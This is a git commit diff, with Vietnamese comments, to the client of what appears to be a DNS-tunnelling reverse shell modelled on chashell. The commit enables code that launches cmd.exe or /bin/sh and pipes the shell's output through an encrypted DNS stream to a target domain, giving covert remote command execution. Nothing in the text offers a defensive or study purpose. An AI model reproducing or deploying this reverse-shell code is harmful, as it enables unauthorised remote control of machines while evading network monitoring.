8ccbc20e9102e9976ce57b826ff1e1fc4b4a6949
Hồ Duy Quốc Bảo <hoduyquocbao@gmail.com>
2021-09-17 10:58:55 +0700

    up

--- cmd/client/chashell.go
+++ cmd/client/chashell.go
@@ -5,6 +5,8 @@ import (
 	"fmt"
 	"ipwf/lib/transport"
 	"os"
+	"os/exec"
+	"runtime"
 )
 
 // khởi tạo 2 mảng chứa tên miền và encryptionKey
@@ -15,42 +17,20 @@ var (
 
 func main() {
 	// khởi tạo cmd bằng exec.Cmd của hệ thống
-	// var cmd *exec.Cmd
+	var cmd *exec.Cmd
 
-	// // // kiểm tra nếu bằng window thì sử dụng cmd.exe
-	// if runtime.GOOS == "windows" {
-	// 	cmd = exec.Command("cmd.exe")
-	// } else {
-	// 	// nếu khác window thì sử dụng mặc định của unix
-	// 	cmd = exec.Command("/bin/sh", "-c", "/bin/sh")
-	// }
+	// // kiểm tra nếu bằng window thì sử dụng cmd.exe
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd.exe")
+	} else {
+		// nếu khác window thì sử dụng mặc định của unix
+		cmd = exec.Command("/bin/sh", "-c", "/bin/sh")
+	}
 
 	// khởi tạo dnsTransport bằng dữ liệu đã gói của DNSStream
 	dnsTransport := transport.DNSStream(targetDomain, encryptionKey)
 
-	// // gán cho cmd.Stdout bằng dữ liệu của dnsTransport
-	// cmd.Stdout = dnsTransport
-
-	// // gán cho cmd.Stderr bằng dữ liệu của dnsTransport
-	// cmd.Stderr = dnsTransport
-
-	// // gán cho cmd.Stdin bằng dữ liệu của dnsTransport
-	// cmd.Stdin = dnsTransport
-	// cmd.Stdin = bufio.NewReader(os.Stdin)
-
-	scanners := bufio.NewScanner(dnsTransport)
-	// scanner.Text() = dnsTransport
-	for scanners.Scan() {
-		fmt.Println(scanners.Text())
-	}
-
-	if scanners.Err() != nil {
-		// Handle error.
-		fmt.Println(scanners.Err())
-
-	}
-
-	scanner := bufio.NewScanner(os.Stdin)
+	scanner := bufio.NewScanner(dnsTransport)
 	// scanner.Text() = dnsTransport
 	for scanner.Scan() {
 		fmt.Println(scanner.Text())
@@ -62,13 +42,23 @@ func main() {
 
 	}
 
+	// // gán cho cmd.Stdout bằng dữ liệu của dnsTransport
+	cmd.Stdout = dnsTransport
+
+	// // gán cho cmd.Stderr bằng dữ liệu của dnsTransport
+	cmd.Stderr = dnsTransport
+
+	// // gán cho cmd.Stdin bằng dữ liệu của dnsTransport
+	// cmd.Stdin = dnsTransport
+	cmd.Stdin = bufio.NewReader(os.Stdin)
+
 	// // hiển thị dnsTransport để kiểm xoát thêm
 
 	// //	khởi tạo err bằng cách chạy cmd.Run()
-	// err := cmd.Run()
+	err := cmd.Run()
 
 	// // nếu có lỗi sẽ trả về
-	// if err != nil {
-	// 	return
-	// }
+	if err != nil {
+		return
+	}
 }
